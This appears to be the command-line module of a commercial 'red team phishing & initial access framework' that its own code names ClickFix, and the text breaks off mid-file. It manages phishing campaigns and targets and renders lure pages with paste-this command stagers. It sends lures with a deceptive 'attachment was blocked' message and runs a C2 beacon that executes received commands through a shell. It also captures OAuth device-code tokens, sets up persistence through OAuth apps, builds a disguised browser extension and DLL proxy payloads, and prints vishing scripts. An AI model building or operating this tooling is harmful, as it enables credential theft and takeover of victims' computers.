# language: Python 3.11+, file: cf/cli.py
# *command surface — campaign, lure, serve, delivery, c2, payload, relay*
from __future__ import annotations

import json
import logging
import os
import subprocess
import sys
from collections.abc import Callable, Iterator
from contextlib import contextmanager
from pathlib import Path
from typing import Any

from .util import (
    c_bold,
    c_cyan,
    c_dim,
    c_gray,
    c_green,
    c_magenta,
    c_purple,
    c_red,
    c_white,
    c_yellow,
    detect_color,
    json_dumps,
    new_token,
    resolve_secret,
    run_async,
    set_color,
    write_text,
)

BANNER = """\
{purple} ██████╗ ███████╗██╗   ██╗███████╗████████╗██╗   ██╗██████╗ ███████╗{/purple}
{purple} ██╔══██╗██╔════╝██║   ██║██╔════╝╚══██╔══╝╚██╗ ██╔╝██╔══██╗██╔════╝{/purple}
{purple} ██████╔╝█████╗  ██║   ██║███████╗   ██║    ╚████╔╝ ██████╔╝█████╗{/purple}
{purple} ██╔══██╗██╔══╝  ██║   ██║╚════██║   ██║     ╚██╔╝  ██╔══██╗██╔══╝{/purple}
{purple} ██║  ██║███████╗╚██████╔╝███████║   ██║      ██║   ██║  ██║███████╗{/purple}
{purple} ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚══════╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝╚══════╝{/purple}
{dim}                                                        v{version}{/dim}
{dim}                           red team phishing & initial access framework{/dim}
"""


def _fmt_banner(raw: str) -> str:
    replacements = {
        "{purple}": c_purple(""),
        "{/purple}": "",
        "{dim}": c_dim(""),
        "{/dim}": "",
    }
    for k, v in replacements.items():
        raw = raw.replace(k, v)
    return raw


def text(msg: str = "") -> None:
    print(msg)


def ok(msg: str) -> None:
    print(f"{c_green('[+]')} {msg}")


def warn(msg: str) -> None:
    print(f"{c_yellow('[!]')} {msg}")


def err(msg: str) -> None:
    print(f"{c_red('[-]')} {msg}", file=sys.stderr)


# flags that never consume the next token — `status --json mycamp` must keep
# the positional; everything not listed here is scalar (last value wins)
# except LIST_FLAGS, which accumulate into a list for _as_list consumers.
BOOLEAN_FLAGS = frozenset({
    "all",
    "debug",
    "filter",
    "json",
    "no-auth",
    "no-browser",
    "no-color",
    "no-colour",
    "serveable",
    "sigma",
})
LIST_FLAGS = frozenset({"field", "only", "what"})


def emit_json(obj: Any) -> None:
    print(json_dumps(obj))


@contextmanager
def _exit_on(*exc_types: type[BaseException]) -> Iterator[None]:
    try:
        yield
    except exc_types as exc:
        raise SystemExit(str(exc).strip("'")) from None


def _num(flags: dict[str, Any], key: str, default: Any, cast: Callable[[Any], Any]) -> Any:
    raw = flags.get(key, default)
    try:
        return cast(raw)
    except (TypeError, ValueError):
        raise SystemExit(f"invalid --{key}: {raw!r}") from None


def _beacon_exec(cmd: str) -> str:
    return subprocess.run(
        cmd,
        shell=True,
        capture_output=True,
        text=True,
        timeout=120,
        check=False,
    ).stdout


def _configure_streams() -> None:
    """stdio defaults to the ansi codepage on windows pipes; every message
    we emit (banner, arrows, status json) is utf-8."""
    for stream in (sys.stdout, sys.stderr):
        reconfigure = getattr(stream, "reconfigure", None)
        if reconfigure is None:
            continue
        try:
            reconfigure(encoding="utf-8", errors="replace", line_buffering=True)
        except (ValueError, OSError):
            try:
                reconfigure(errors="replace", line_buffering=True)
            except (ValueError, OSError):
                pass


def parse_args(argv: list[str]) -> tuple[list[str], dict[str, Any]]:
    pos: list[str] = []
    flags: dict[str, Any] = {}
    i = 0
    while i < len(argv):
        tok = argv[i]
        if tok.startswith("--"):
            key = tok[2:]
            value: Any = True
            if "=" in key:
                key, value = key.split("=", 1)
            elif (
                key not in BOOLEAN_FLAGS
                and i + 1 < len(argv)
                and not argv[i + 1].startswith("--")
            ):
                value = argv[i + 1]
                i += 1
            if key in LIST_FLAGS:
                flags.setdefault(key, []).append(value)
            else:
                flags[key] = value
        else:
            pos.append(tok)
        i += 1
    return pos, flags


def _as_list(value: Any) -> list[Any]:
    if value is None:
        return []
    return value if isinstance(value, list) else [value]


def _render_table(rows: list[dict[str, Any]]) -> str:
    """Aligned fixed-width table — no dependency, safe on any console."""
    if not rows:
        return c_dim("  (empty)")
    cols = list(rows[0].keys())
    widths = {
        c: max(len(c), *(len(str(r.get(c, ""))) for r in rows)) for c in cols
    }
    head = "  ".join(c_dim(c.upper().ljust(widths[c])) for c in cols)
    sep = c_dim("  ".join("-" * widths[c] for c in cols))
    body = [
        "  ".join(str(r.get(c, "")).ljust(widths[c]) for c in cols)
        for r in rows
    ]
    return "\n".join([head, sep, *body])


def _render_kv(pairs: list[tuple[str, str]]) -> None:
    """Aligned key: value block with cyan keys."""
    if not pairs:
        return
    w = max(len(k) for k, _ in pairs)
    for k, v in pairs:
        text(f"  {c_cyan(k.ljust(w))}  {v}")


class Cli:
    def __init__(self, argv: list[str], db_path: str = "clickfix.db") -> None:
        self.pos, self.flags = parse_args(argv)
        self.db_path = str(self.flags.get("db") or db_path)
        self._store: Any = None
        self.owns_store = True
        self.handlers: dict[str, Callable[[], None]] = {
            "campaign": self.cmd_campaign,
            "target": self.cmd_target,
            "targets": self.cmd_target,
            "lure": self.cmd_lure,
            "stager": self.cmd_stager,
            "export": self.cmd_export,
            "status": self.cmd_status,
            "serve": self.cmd_serve,
            "deliver": self.cmd_deliver,
            "beacon": self.cmd_beacon,
            "aitm": self.cmd_aitm,
            "ext": self.cmd_ext,
            "relay": self.cmd_relay,
            "payload": self.cmd_payload,
            "technique": self.cmd_technique,
            "techniques": self.cmd_technique,
            "report": self.cmd_report,
            "playbook": self.cmd_playbook,
            "access": self.cmd_access,
            "creds": self.cmd_creds,
            "lateral": self.cmd_lateral,
            "collect": self.cmd_collect,
            "exfil": self.cmd_exfil,
            "opsec": self.cmd_opsec,
            "license": self.cmd_license,
            "gui": self.cmd_gui,
            "version": self.cmd_version,
            "help": self.cmd_help,
            "-h": self.cmd_help,
            "--help": self.cmd_help,
        }

    # ─── store ───
    @property
    def store(self) -> Any:
        if self._store is None:
            from .store import Store

            self._store = Store(self.db_path)
        return self._store

    @property
    def lic(self) -> Any:
        from .license import effective

        return effective(self._store)

    def _campaign(self, ref: str | None = None) -> dict[str, Any]:
        ref = ref or (self.pos[1] if len(self.pos) > 1 else "")
        if not ref:
            camps = self.store.list_campaigns()
            if len(camps) == 1:
                return camps[0]
            raise SystemExit("campaign ref required (--db or `campaign list`)")
        camp = self.store.get_campaign(ref)
        if not camp:
            raise SystemExit(f"unknown campaign: {ref}")
        return camp

    def _base(self, camp: dict[str, Any] | None = None) -> str:
        url = self.flags.get("url") or (camp or {}).get("base_url") or ""
        return str(url).rstrip("/")

    # ─── dispatch ───
    def _bad(self, usage: str) -> None:
        err(usage)
        raise SystemExit(2)

    def _feature(self, feature: str) -> None:
        """Tier gate — LicenseError (run-safe) with the upgrade path stated."""
        from .license import require_feature

        require_feature(self.lic, feature)

    def _need(self, n: int, usage: str) -> None:
        if len(self.pos) < n:
            self._bad(usage)

    def run(self) -> int:
        if not self.pos:
            self.cmd_help()
            return 0
        handler = self.handlers.get(self.pos[0])
        if handler is None:
            err(f"unknown command: {self.pos[0]}")
            self.cmd_help()
            return 2
        try:
            handler()
        except SystemExit as exc:
            code = exc.code
            if code in (0, None):
                return 0
            if isinstance(code, int):
                return code
            err(str(code))
            return 1
        except KeyboardInterrupt:
            err("interrupted")
            return 130
        except Exception as exc:  # noqa: BLE001 — CredsError/LicenseError/etc
            err(str(exc))
            return 1
        finally:
            if self.owns_store and self._store is not None:
                self._store.close()
        return 0

    # ─── help ───
    def cmd_help(self) -> None:
        from . import __version__

        text(_fmt_banner(BANNER).format(version=__version__))
        text()
        text(f"  {c_bold('usage:')} clickfix.py {c_cyan('<command>')} [options]")
        text()

        sections = [
            ("campaign", [
                ("campaign new <name>", "[--scenario S] [--kind K] [--technique T] [--url U] [--locale fr|en] [--profile F.json]"),
                ("campaign list", "all campaigns"),
                ("target add <campaign>", "[--email E] [--label L] [--kind K]"),
                ("target list <campaign>", "targets + status"),
                ("lure <campaign>", "[--token T] [--out DIR]  render lure html"),
                ("export <campaign>", "token/url/status table"),
                ("report <campaign>", "[--out FILE] [--csv FILE]  engagement report"),
                ("status [campaign]", "funnel counts + last events"),
            ]),
            ("techniques", [
                ("technique list", "[--surface S] [--category C] [--tag T] [--q TEXT] [--json]"),
                ("technique show <id>", "[--url BASE]  full telemetry + opsec notes"),
                ("technique export", "[--format md|json] [--sigma] [--out F]"),
            ]),
            ("delivery & c2", [
                ("serve", "[--host H] [--port P] [--url U] [--cert C --key K] [--filter]"),
                ("deliver <provider> <campaign>", "[--token X] [--message M] [--field k=v]"),
                ("beacon <service> --channel C", "[--token X] [--bid ID] [--interval N] [--jitter F] [--deadman URL]"),
                ("aitm refresh|pivot|persist", "device code pivot chain"),
            ]),
            ("apt modules", [
                ("access devicecode --client-id X", "[--tenant T]  oauth device code (T1528)"),
                ("access consent --client-id X", "[--tenant T]  consent grant (T1550.001)"),
                ("access vishing", "[device_code|mfa|support]  prewritten script"),
                ("creds spray <users.txt> --password P", "o365 spray w/ lockout guard"),
                ("creds kerberoast|asrep|adcs|dpapi", "command generators w/ telemetry"),
                ("lateral <pth|winrm|wmi|sccm|gpo> <host>", "lateral movement builders"),
                ("collect <screen|files|browser|clipboard|wifi>", "collection snippets"),
                ("exfil <http|slack|rclone>", "[--url U] [--key K]  exfil builders"),
                ("opsec preflight <url>", "dns/tls/headers/ua-filter checks"),
            ]),
            ("license & gui", [
                ("license status|activate <key>|deactivate", "offline license management"),
                ("license issue --tier pro|trial|team", "vendor: generate a key"),
                ("license verify <key>", "check a key without saving"),
                ("gui", "[--host H] [--port P] [--no-browser] [--no-auth]  pro dashboard"),
            ]),
            ("payload & stager", [
                ("ext build <out.zip> <c2_url> <device_id>", "[--name N]"),
                ("relay lambda|azure|client", "[args]"),
                ("payload proxy <host_dll> [outdir]", "proxy dll builder"),
                ("payload hpp", "c++ payload header"),
                ("payload chain <os> [hint]", "multi-stage chain"),
                ("payload xor <file> --token T", "encrypt stage2 w/ token key"),
                ("stager command <kind> <url>", "print a win+r command"),
                ("playbook", "[saas|c2|ext|relay|stager|scenario]"),
            ]),
        ]
        for title, cmds in sections:
            text(f"  {c_magenta(title)}")
            for cmd, desc in cmds:
                text(f"    {c_white(cmd.ljust(44))} {c_dim(desc)}")
            text()
        text(f"  {c_dim('globals:')} {c_dim('--db <path>  state file (default clickfix.db)  --no-color  disable ansi')}")
        text()

    def cmd_version(self) -> None:
        from . import __version__

        text(__version__)

    # ─── campaign ───
    def cmd_campaign(self) -> None:
        if len(self.pos) < 2:
            sub = "list"
        else:
            sub = self.pos[1]
        if sub == "list":
            camps = self.store.list_campaigns()
            if not camps:
                text(c_dim("  no campaigns"))
                return
            rows = [
                {
                    "id": c["id"],
                    "name": c["name"],
                    "scenario": c["scenario"],
                    "url": c["base_url"],
                }
                for c in camps
            ]
            text(_render_table(rows))
            return
        if sub != "new":
            err("campaign new|list")
            raise SystemExit(2)
        if len(self.pos) < 3:
            err("campaign new <name>")
            raise SystemExit(2)
        from .license import LicenseError, check_quota

        try:
            check_quota(self.lic, self.store)
        except LicenseError as exc:
            err(str(exc))
            raise SystemExit(1) from None
        technique = str(self.flags.get("technique", ""))
        kind = str(self.flags.get("kind", ""))
        if technique:
            from .techniques import get as get_technique

            try:
                tech = get_technique(technique)
            except KeyError as exc:
                raise SystemExit(str(exc)) from None
            if not kind and tech.kind:
                kind = tech.kind
        meta: dict[str, Any] = {
            "kind": kind or "psenc",
            "locale": str(self.flags.get("locale", "fr")),
            "stage2_url": str(self.flags.get("stage2", "")),
            "stage2_type": str(self.flags.get("stage2-type", "none")),
            "continue_url": str(
                self.flags.get("continue", "https://www.google.com")
            ),
        }
        profile = self.flags.get("profile")
        if profile:
            profile_path = Path(str(profile))
            if not profile_path.exists():
                raise SystemExit(f"profile not found: {profile_path}")
            try:
                profile_data = json.loads(profile_path.read_text(encoding="utf-8"))
            except ValueError as exc:
                raise SystemExit(f"invalid profile json: {exc}") from None
            if not isinstance(profile_data, dict):
                raise SystemExit("profile must be a json object")
            meta.update(profile_data)
        if technique:
            meta["technique"] = technique
        cid = self.store.create_campaign(
            self.pos[2],
            scenario=str(self.flags.get("scenario", "browser_update")),
            base_url=str(self.flags.get("url", "")),
            meta=meta,
        )
        ok(f"campaign {c_cyan(cid)} created ({self.pos[2]})")
        text(f"  {c_dim('next:')} target add {cid} --email someone@corp.tld")

    # ─── target ───
    def cmd_target(self) -> None:
        if len(self.pos) < 2:
            err("target add|list")
            raise SystemExit(2)
        sub = self.pos[1]
        ref = self.pos[2] if len(self.pos) > 2 else None
        if sub == "list":
            camp = self._campaign(ref)
            rows = self.store.targets(camp["id"])
            if not rows:
                text(c_dim("  no targets"))
                return
            status_colors = {
                "created": c_gray,
                "clicked": c_yellow,
                "delivered": c_cyan,
                "executed": c_green,
            }
            for t in rows:
                sc = status_colors.get(t["status"], lambda s: s)
                text(
                    f"  {c_cyan(t['token'])}  {sc(t['status'].ljust(10))}  "
                    f"{t['email']}  {c_dim(t['label'])}"
                )
            return
        if sub != "add":
            err("target add|list")
            raise SystemExit(2)
        if not ref:
            err("target add <campaign> --email <addr>")
            raise SystemExit(2)
        camp = self._campaign(ref)
        from .license import LicenseError, check_quota

        try:
            check_quota(self.lic, self.store, camp["id"])
        except LicenseError as exc:
            err(str(exc))
            raise SystemExit(1) from None
        email = str(self.flags.get("email", ""))
        meta: dict[str, Any] = {}
        if self.flags.get("kind"):
            meta["kind"] = str(self.flags["kind"])
        if self.flags.get("stage2"):
            meta["stage2_url"] = str(self.flags["stage2"])
        if self.flags.get("stage2-type"):
            meta["stage2_type"] = str(self.flags["stage2-type"])
        token = self.store.add_target(
            camp["id"],
            email=email,
            label=str(self.flags.get("label", "")),
            meta=meta,
        )
        base = self._base(camp)
        ok(f"target {c_cyan(token)}")
        if base:
            from .server import settings_for

            kind = str(meta.get("kind") or settings_for(self.store, camp)["kind"])
            text(f"  {c_dim('lure:')}   {c_yellow(base + '/l/' + token)}")
            text(f"  {c_dim('stager:')} {c_yellow(base + '/s/' + kind + '/' + token)}")

    # ─── lure ───
    def cmd_lure(self) -> None:
        from .lure import LureBuilder
        from .server import settings_for
        from .stager import Stager

        camp = self._campaign()
        settings = settings_for(self.store, camp)
        token_filter = self.flags.get("token")
        out_dir = Path(str(self.flags.get("out", "lures")))
        rows = self.store.targets(camp["id"])
        if token_filter:
            rows = [t for t in rows if t["token"] == token_filter]
        if not rows:
            err("no targets for this campaign")
            raise SystemExit(1)
        base = self._base(camp)
        if not base:
            raise SystemExit("--url required (or set it on the campaign)")
        written = 0
        for t in rows:
            kind = str(
                json.loads(t.get("meta") or "{}").get("kind", settings["kind"])
            )
            command = Stager.command(
                kind, f"{base}/s/{kind}/{t['token']}"
            )
            html = LureBuilder.render(
                settings["scenario"],
                token=t["token"],
                command=command,
                continue_url=settings["continue_url"],
                locale=settings["locale"],
                steps=settings.get("steps"),
            )
            path = write_text(out_dir / f"{t['token']}.html", html)
            text(f"{path}  [{kind}]")
            written += 1
        ok(f"{written} lure(s) written to {out_dir}")

    def cmd_export(self) -> None:
        camp = self._campaign()
        base = self._base(camp)
        rows = self.store.targets(camp["id"])
        if not rows:
            text(c_dim("  no targets"))
            return
        export_rows = [
            {
                "token": t["token"],
                "email": t["email"],
                "status": t["status"],
                "url": f"{base}/l/{t['token']}" if base else "",
            }
            for t in rows
        ]
        text(_render_table(export_rows))

    def cmd_status(self) -> None:
        if len(self.pos) > 1:
            ref = self.pos[1]
        else:
            camps = self.store.list_campaigns()
            if not camps:
                text(c_dim("  no campaigns"))
                return
            ref = camps[0]["id"]
        st = self.store.status(ref)
        if st.get("error"):
            raise SystemExit(str(st["error"]))
        by = st.get("by_status", {})
        text(c_bold(f"  campaign {ref}"))
        text()
        _render_kv([
            ("targets", str(st.get("targets", 0))),
            ("created", c_gray(str(by.get("created", 0)))),
            ("clicked", c_yellow(str(by.get("clicked", 0)))),
            ("delivered", c_cyan(str(by.get("delivered", 0)))),
            ("executed", c_green(str(by.get("executed", 0)))),
        ])

    # ─── serve ───
    def cmd_serve(self) -> None:
        from .server import LandingServer

        server = LandingServer(
            self.store,
            host=str(self.flags.get("host", "127.0.0.1")),
            port=_num(self.flags, "port", 8080, int),
            base_url=str(self.flags.get("url", "")),
            filter_scanners=bool(self.flags.get("filter", False)),
        )
        run_async(
            server.serve_forever(
                ssl_certfile=self.flags.get("cert"),
                ssl_keyfile=self.flags.get("key"),
            )
        )

    # ─── delivery ───
    def cmd_deliver(self) -> None:
        from .delivery import SaaSNotifyDelivery

        self._need(3, "deliver <provider> <campaign> [--token X] [--message M]")
        provider, ref = self.pos[1], self.pos[2]
        camp = self._campaign(ref)
        base = self._base(camp)
        if not base:
            raise SystemExit("--url required (or set it on the campaign)")
        token = resolve_secret(
            str(self.flags.get("token", "")), "SAAS_TOKEN", f"{provider} token: "
        )
        if not token:
            raise SystemExit("no provider token")
        message = str(
            self.flags.get(
                "message",
                "{label}: the attachment was blocked — open {url} to restore it",
            )
        )
        fields: dict[str, Any] = {}
        for item in _as_list(self.flags.get("field")):
            if "=" in str(item):
                k, v = str(item).split("=", 1)
                fields[k] = v
        rows = self.store.targets(camp["id"])
        if self.flags.get("only"):
            only = set(_as_list(self.flags["only"]))
            rows = [t for t in rows if t["token"] in only]
        targets = []
        for t in rows:
            payload = dict(fields)
            payload["message"] = message.format(
                label=t["label"] or t["email"] or "file",
                url=f"{base}/l/{t['token']}",
                token=t["token"],
            )
            payload["bid"] = t["token"]
            payload["channel_name"] = str(
                self.flags.get("channel", f"share-{t['token'][:6]}")
            )
            targets.append({"email": t["email"], **payload})
        if not targets:
            raise SystemExit("no targets")
        delivery = SaaSNotifyDelivery(
            self.store, camp["id"], provider, token
        )
        result = run_async(
            delivery.run_batch(targets, concurrency=int(self.flags.get("concurrency", 4)))
        )
        emit_json({k: v for k, v in result.items() if k != "results"})
        for r in result["results"]:
            if not r.get("result", {}).get("ok"):
                text(f"  fail {r.get('email')}: {r.get('result')}")
        outcome_by_email = {
            str(r["email"]): bool((r.get("result") or {}).get("ok"))
            for r in result["results"]
            if r.get("email")
        }
        for t in rows:
            delivered = outcome_by_email.get(str(t["email"]))
            if delivered is None:
                continue
            self.store.set_status(t["token"], "delivered" if delivered else "dead")
        ok("delivery finished")

    # ─── c2 beacon ───
    def cmd_beacon(self) -> None:
        from .c2 import LegitServiceC2, sign_command, verify_signed

        self._need(2, "beacon <service> --channel C [--token X] [--bid ID]")

        # beacon sign "<payload>" -> paste-ready signed command for the
        # channel; the implant only runs what verifies against the same key
        if self.pos[1] == "sign":
            if len(self.pos) < 3:
                raise SystemExit('beacon sign "<payload>"')
            key = resolve_secret(
                str(self.flags.get("sign", "")), "CF_C2_SIGN_KEY", "c2 signing key: "
            )
            if not key:
                raise SystemExit("no signing key (--sign or CF_C2_SIGN_KEY)")
            print("!" + sign_command(self.pos[2], key))
            return

        service = self.pos[1]
        channel = str(self.flags.get("channel", ""))
        if not channel and service not in ("github", "dropbox"):
            raise SystemExit("--channel required")
        token = resolve_secret(
            str(self.flags.get("token", "")), "C2_TOKEN", f"{service} token: "
        )
        if not token:
            raise SystemExit("no c2 token")
        bid = str(self.flags.get("bid") or new_token(8))
        c2 = LegitServiceC2(
            self.store,
            str(self.flags.get("campaign", "cli")),
            service,
            token,
            channel=channel,
            repo=str(self.flags.get("repo", "")),
            path=str(self.flags.get("path", "beacon.json")),
        )

        interval = _num(self.flags, "interval", 60, float)
        jitter = _num(self.flags, "jitter", 0.3, float)
        max_failures = _num(self.flags, "max-failures", 8, int)
        deadman_url = str(self.flags.get("deadman", ""))

        executor = _beacon_exec
        sign_key = str(self.flags.get("sign", "")) or os.environ.get(
            "CF_C2_SIGN_KEY", ""
        )
        if sign_key:
            def signed_exec(text: str) -> str:
                if not verify_signed(text, sign_key):
                    return "rejected: unsigned command"
                return _beacon_exec(text)

            executor = signed_exec
            ok("signed mode on — implant runs only commands via `beacon sign`")

        where = channel or str(self.flags.get("repo", "")) or "default"
        ok(f"beacon {bid} → {service}:{where} every {interval:g}s (ctrl-c to stop)")
        try:
            run_async(
                c2.run_beacon(
                    bid,
                    executor,
                    poll_interval=interval,
                    jitter=jitter,
                    max_failures=max_failures,
                    deadman_url=deadman_url,
                )
            )
        except KeyboardInterrupt:
            ok("beacon stopped")

    # ─── aitm ───
    def cmd_aitm(self) -> None:
        from .chain import AiTMEdgeChain

        if len(self.pos) < 2:
            err("aitm refresh|pivot|persist")
            raise SystemExit(2)
        sub = self.pos[1]
        chain = AiTMEdgeChain(self.store, str(self.flags.get("campaign", "cli")))

        def _emit(result: Any) -> None:
            print(json_dumps(result))
            if isinstance(result, dict) and result.get("error"):
                raise SystemExit(1)

        if sub == "refresh":
            if len(self.pos) < 4:
                raise SystemExit("aitm refresh <client_id> <refresh_token>")
            _emit(
                run_async(
                    chain.refresh_token_to_access(self.pos[2], self.pos[3])
                )
            )
        elif sub == "pivot":
            if len(self.pos) < 3:
                raise SystemExit("aitm pivot <access_token>")
            what = _as_list(self.flags.get("what")) or None
            _emit(run_async(chain.graph_pivot(self.pos[2], what)))
        elif sub == "persist":
            if len(self.pos) < 4:
                raise SystemExit("aitm persist <tenant> <access_token>")
            _emit(
                run_async(
                    chain.persist_oauth_app(self.pos[2], self.pos[3])
                )
            )
        else:
            err("aitm refresh|pivot|persist")
            raise SystemExit(2)

    # ─── extension ───
    def cmd_ext(self) -> None:
        from .ext import ExtensionC2

        self._feature("ext")
        if len(self.pos) < 2:
            err("ext build|manifest|playbook")
            raise SystemExit(2)
        sub = self.pos[1]
        if sub == "build":
            if len(self.pos) < 5:
                raise SystemExit("ext build <out.zip> <c2_url> <device_id>")
            path = ExtensionC2.build_zip(
                self.pos[2],
                self.pos[3],
                self.pos[4],
                ext_name=str(self.flags.get("name", "Productivity Helper")),
            )
            ok(f"extension → {path}")
        elif sub == "manifest":
            print(json_dumps(ExtensionC2.manifest(str(self.flags.get("name", "Productivity Helper")))))
        elif sub == "playbook":
            print(json_dumps(ExtensionC2.distribution_playbook()))
        else:
            err("ext build|manifest|playbook")
            raise SystemExit(2)

    # ─── relay ───
    def cmd_relay(self) -> None:
        from .relay import CloudRelay

        self._feature("relay")
        if len(self.pos) < 2:
            err("relay lambda|azure|client|playbook")
            raise SystemExit(2)
        sub = self.pos[1]
        if sub in ("lambda", "azure"):
            out_dir = str(self.flags.get("out", "."))
            written = CloudRelay.write_handlers(out_dir)
            for k, v in written.items():
                ok(f"{k} → {v}")
        elif sub == "client":
            if len(self.pos) < 4:
                raise SystemExit("relay client <c2_url> <key>")
            text(CloudRelay.beacon_client(self.pos[2], self.pos[3]))
        elif sub == "playbook":
            print(json_dumps(CloudRelay.deployment_playbook()))
        else:
            err("relay lambda|azure|client|playbook")
            raise SystemExit(2)

    # ─── payload ───
    def cmd_payload(self) -> None:
        from .payload import PayloadFactory

        self._feature("payload")
        if len(self.pos) < 2:
            err("payload proxy|hpp|chain")
            raise SystemExit(2)
        sub = self.pos[1]
        if sub == "proxy":
            if len(self.pos) < 3:
                raise SystemExit("payload proxy <host_dll> [outdir]")
            try:
                res = PayloadFactory.generate_dll_proxy(
                    self.pos[2],
                    output_dir=self.pos[3] if len(self.pos) > 3 else "./build",
                )
            except (ValueError, OSError) as exc:
                err(str(exc))
                raise SystemExit(1) from None
            print(json_dumps(res))
        elif sub == "hpp":
            out = write_text(
                str(self.flags.get("out", "payload_factory.hpp")),
                PayloadFactory._payload_hpp_source(),
            )
            ok(f"{out} written")
        elif sub == "chain":
            if len(self.pos) < 3:
                raise SystemExit("payload chain <os> [edr_hint]")
            print(
                json_dumps(
                    PayloadFactory.build_chain_for_target(
                        self.pos[2],
                        self.pos[3] if len(self.pos) > 3 else "",
                    )
                )
            )
        elif sub == "xor":
            from .stager import xor_bytes, xor_key

            if len(self.pos) < 3:
                raise SystemExit("payload xor <file> --token T")
            token = str(self.flags.get("token", ""))
            if not token:
                raise SystemExit("--token required (target token the loader will use)")
            key = xor_key(token)
            src = Path(self.pos[2])
            data = src.read_bytes()
            out = src.with_suffix(src.suffix + ".xor")
            out.write_bytes(xor_bytes(data, key))
            ok(f"{out} written — key={key.hex()}")
            text("  prepend to the loader: $k=[byte[]](" + ",".join(str(b) for b in key) + ")")
        else:
            err("payload proxy|hpp|chain|xor")
            raise SystemExit(2)

    # ─── stager / playbooks ───
    def cmd_stager(self) -> None:
        from .stager import Stager

        if len(self.pos) < 2:
            err("stager command <kind> <url>")
            raise SystemExit(2)
        if self.pos[1] != "command" or len(self.pos) < 4:
            raise SystemExit("stager command <kind> <url>")
        text(Stager.command(self.pos[2], self.pos[3]))

    # ─── technique catalog ───
    def cmd_technique(self) -> None:
        from .techniques import TECHNIQUES, find, get, markdown, table

        sub = self.pos[1] if len(self.pos) > 1 else "list"
        if sub == "list":
            rows = table(
                find(
                    surface=str(self.flags.get("surface", "")),
                    category=str(self.flags.get("category", "")),
                    query=str(self.flags.get("q", "")),
                    tag=str(self.flags.get("tag", "")),
                    serveable=(
                        None if "serveable" not in self.flags else True
                    ),
                )
            )
            if not rows:
                text("no techniques match those filters")
                return
            print(
                json_dumps(rows)
                if self.flags.get("json")
                else _render_table(rows)
            )
            return
        if sub == "show":
            if len(self.pos) < 3:
                raise SystemExit("technique show <id>")
            try:
                tech = get(self.pos[2])
            except KeyError as exc:
                raise SystemExit(str(exc)) from None
            if self.flags.get("json"):
                print(json_dumps(tech.as_dict()))
                return
            base = str(self.flags.get("url", "https://HOST"))
            text(c_bold(f"  {tech.id}") + f" — {tech.name}")
            text()
            stars = c_green("★" * tech.reliability) + c_dim("☆" * (5 - tech.reliability))
            _render_kv([
                ("surface", tech.surface),
                ("category", tech.category),
                ("delivery", tech.kind or c_dim("operator infra")),
                ("clipboard", "yes" if tech.clipboard else "no"),
                ("min os", tech.min_os),
                ("mitre", tech.mitre or c_dim("n/a")),
                ("reliability", stars),
                ("tags", ", ".join(tech.tags) or c_dim("-")),
            ])
            text()
            text(f"  {c_dim('steps:')}")
            for i, step in enumerate(tech.steps, 1):
                text(f"    {c_cyan(str(i) + '.')} {step}")
            text()
            _render_kv([
                ("command", c_yellow(tech.command_for(base, "TOKEN"))),
                ("telemetry", ", ".join(tech.telemetry)),
                ("detection", tech.detection),
                ("opsec", tech.opsec),
            ])
            return
        if sub == "export":
            fmt = str(self.flags.get("format", "md"))
            if self.flags.get("sigma") or fmt.startswith("sigma"):
                self._feature("sigma")
                from .techniques import sigma_rules

                body = sigma_rules(
                    serveable_only=not self.flags.get("all", False)
                )
                out = self.flags.get("out")
                if out:
                    p = write_text(str(out), body)
                    ok(f"sigma rules → {p}")
                else:
                    print(body)
                return
            body = (
                markdown()
                if fmt.startswith("md")
                else json_dumps([t.as_dict() for t in TECHNIQUES.values()])
            )
            out = self.flags.get("out")
            if out:
                p = write_text(str(out), body)
                ok(f"{len(TECHNIQUES)} techniques → {p}")
            else:
                print(body)
            return
        err("technique list|show|export")
        raise SystemExit(2)

    # ─── engagement report ───
    def cmd_report(self) -> None:
        from .report import build, csv_rows

        if len(self.pos) < 2:
            raise SystemExit("report <campaign> [--out FILE] [--csv FILE]")
        camp = self._campaign(self.pos[1])
        watermark = ""
        if self.lic.watermark:
            watermark = (
                "> **DEMO BUILD — evaluation use only.** "
                "Remove by activating a license: `clickfix.py license activate <key>`\n\n"
            )
        if self.flags.get("csv"):
            self._feature("csv")
            with _exit_on(KeyError):
                body = csv_rows(self.store, camp["id"])
            # csv export is tier-gated, so only licensed output passes here —
            # demo watermarking accounts sit at the `report` (md/markdown) path
            p = write_text(str(self.flags["csv"]), body)
            ok(f"csv timeline → {p}")
            return
        with _exit_on(KeyError):
            body = build(self.store, camp["id"])
        out = self.flags.get("out")
        if out:
            p = write_text(str(out), watermark + body)
            ok(f"report → {p}")
        else:
            print(watermark + body)

    # ─── initial access ───
    def cmd_access(self) -> None:
        from .access import (
            AccessError,
            DeviceCodeFlow,
            authorize_url,
            vishing_script,
        )

        if len(self.pos) < 2:
            err("access devicecode|consent|vishing")
            raise SystemExit(2)
        sub = self.pos[1]
        if sub == "devicecode":
            client_id = str(self.flags.get("client-id", ""))
            if not client_id:
                raise SystemExit("--client-id required (app registration)")
            flow = DeviceCodeFlow(
                client_id,
                tenant=str(self.flags.get("tenant", "common")),
                scopes=str(self.flags.get("scopes", "")) or "openid profile offline_access",
            )
            try:
                result = run_async(flow.run(timeout=float(self.flags.get("timeout", 900))))
            except AccessError as exc:
                err(str(exc))
                raise SystemExit(1) from None
            print(json_dumps({k: v for k, v in result.items() if k != "tokens"}))
            tokens = result.get("tokens", {})
            if tokens:
                ok("tokens captured")
                text(f"  access_token:  {str(tokens.get('access_token', ''))[:40]}…")
                text(f"  refresh_token: {str(tokens.get('refresh_token', ''))[:40]}…")
            return
        if sub == "consent":
            client_id = str(self.flags.get("client-id", ""))
            url = authorize_url(
                client_id,
                tenant=str(self.flags.get("tenant", "common")),
                redirect_uri=str(self.flags.get("redirect", "https://HOST/oauth/cf")),
                scopes=str(self.flags.get("scopes", "")) or "openid profile offline_access",
                state=str(self.flags.get("state", "cf")),
            )
            text(url)
            return
        if sub == "vishing":
            kind = self.pos[2] if len(self.pos) > 2 else "device_code"
            try:
                lines = vishing_script(
                    kind,
                    org=str(self.flags.get("org", "IT Service Desk")),
                    ticket=str(self.flags.get("ticket", "4821")),
                    code=str(self.flags.get("code", "")),
                    channel=str(self.flags.get("channel", "e-mail")),
                )
            except AccessError as exc:
                raise SystemExit(str(exc)) from None
            for i, line in enumerate(lines, 1):
                text(f"{i}. {line}")
            return
        err("access devicecode|consent|vishing")
        raise SystemExit(2)

    # ─── credential access ───
    def cmd_creds(self) -> None:
